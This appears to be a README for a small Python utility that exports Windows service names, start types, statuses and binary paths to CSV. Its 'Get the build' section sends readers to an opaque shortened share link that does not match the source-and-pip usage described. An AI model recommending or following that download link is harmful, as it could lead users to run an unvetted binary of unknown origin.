# Services List Export

A snapshot of services before someone 'tunes' them.

Export Windows services with start type and status to CSV.

## Get the build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

## Why

A support ticket needs the service list, not a screenshot.

This writes name, start type, status, and path to CSV.

## What it does

- CSV export
- Filter by running or disabled
- Includes binary path
- Read-only

## Usage

```text
python -m pip install -r requirements.txt
python main.py --help
```
